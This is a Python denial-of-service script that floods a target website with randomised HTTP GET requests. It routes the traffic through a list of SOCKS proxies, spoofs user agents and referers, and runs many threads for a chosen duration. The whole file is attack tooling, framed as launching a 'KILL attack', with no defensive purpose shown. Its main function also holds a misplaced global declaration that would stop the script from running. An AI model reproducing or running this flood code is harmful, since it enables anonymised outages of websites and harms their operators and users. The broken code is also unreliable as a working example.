import socks
import socket
import ssl
import threading
import random
import time
from colorama import Fore
import warnings
import os

warnings.filterwarnings("ignore")

COLOR_CODE = {
    "RESET": "\033[0m",
    "CYAN": "\033[36m",
    "BLUE": "\033[34m",
}

def cyan_to_blue(text):
    start_color = (0, 255, 255)  # Cyan
    end_color = (0, 0, 255)      # Blue
    gradient = ""
    for i, char in enumerate(text):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient += f"\033[38;2;{r};{g};{b}m{char}"
    gradient += "\033[0m"
    return gradient

acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
]

referers = [
    "https://www.google.com/search?q=",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.bing.com/search?q=",
]

proxies = []
target = ""
path = "/"
port = 80
protocol = "http"
brute = True
cookies = ""
Intn = random.randint
Choice = random.choice

def load_proxies():
    global proxies
    try:
        with open("proxies.txt", "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
        if not proxies:
            print(cyan_to_blue("> Proxy file is empty."))
            return False
        return True
    except Exception as e:
        print(cyan_to_blue(f"> Failed to load proxy file: {e}"))
        return False

def getuseragent():
    platform = Choice(['Macintosh', 'Windows', 'X11'])
    if platform == 'Macintosh':
        os = Choice(['68K', 'PPC', 'Intel Mac OS X'])
    elif platform == 'Windows':
        os = Choice(['Win3.11', 'WinNT3.51', 'Windows NT 6.0', 'Windows NT 10.0; Win64; x64'])
    elif platform == 'X11':
        os = Choice(['Linux i686', 'Linux x86_64'])
    browser = Choice(['chrome', 'firefox'])
    if browser == 'chrome':
        webkit = str(Intn(500, 599))
        version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
    else:
        version = str(Intn(1, 72)) + '.0'
        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/20100101 Firefox/' + version

def randomurl():
    return str(Intn(0, 271400281257))

def GenReqHeader(method):
    global cookies, target, path
    header = ""
    if method == "get":
        connection = "Connection: Keep-Alive\r\n"
        if cookies != "":
            connection += "Cookies: " + str(cookies) + "\r\n"
        accept = Choice(acceptall)
        referer = "Referer: " + Choice(referers) + target + path + "\r\n"
        useragent = "User-Agent: " + getuseragent() + "\r\n"
        header = referer + useragent + accept + connection + "\r\n"
    return header

def ParseUrl(original_url):
    global target, path, port, protocol
    original_url = original_url.strip()
    path = "/"
    protocol = "http"
    port = 80
    if original_url[:7] == "http://":
        url = original_url[7:]
        protocol = "http"
    elif original_url[:8] == "https://":
        url = original_url[8:]
        protocol = "https"
    else:
        print(cyan_to_blue("> Invalid URL format. Use: http:// or https://"))
        return False
    tmp = url.split("/")
    website = tmp[0]
    check = website.split(":")
    if len(check) != 1:
        port = int(check[1])
    else:
        if protocol == "https":
            port = 443
    target = check[0]
    if len(tmp) > 1:
        path = url.replace(website, "", 1)
    return True

def setup_socket(proxy_type, proxy):
    s = socks.socksocket()
    proxy_ip, proxy_port = proxy.split(":")
    if proxy_type == 4:
        s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
    elif proxy_type == 5:
        s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
    elif proxy_type == 0:
        s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
    if brute:
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.settimeout(5)
    return s

def kill(event, proxy_type):
    global proxies, target, path, port, protocol
    headers_pool = [GenReqHeader("get") for _ in range(200)]
    add = "?" if "?" not in path else "&"
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.settimeout(1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            requests_to_send_per_connection = 20000
            for _ in range(requests_to_send_per_connection):
                header = Choice(headers_pool)
                get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
                request = get_host + header
                sent = s.send(str.encode(request))
                if not sent:
                    break
            s.close()
        except:
            if s:
                s.close()

def main():
    import sys
    if len(sys.argv) < 4:
        print(cyan_to_blue("> Usage: python kill.py <url> <threads> <duration> [port]"))
        sys.exit(1)
    url = sys.argv[1]
    threads = int(sys.argv[2])
    duration = int(sys.argv[3])
    port = int(sys.argv[4]) if len(sys.argv) > 4 else None
    proxy_type = 5
    if not load_proxies():
        sys.exit(1)
    if not ParseUrl(url):
        sys.exit(1)
    if port:
        global port
        port = port
    event = threading.Event()
    print(cyan_to_blue(f"> Launching KILL attack on {url} with {threads} threads for {duration} seconds..."))
    for _ in range(threads):
        th = threading.Thread(target=kill, args=(event, proxy_type,))
        th.daemon = True
        th.start()
    event.set()
    time.sleep(duration)
    event.clear()
    print(cyan_to_blue("> Attack KILL finished."))

if __name__ == "__main__":
    main()
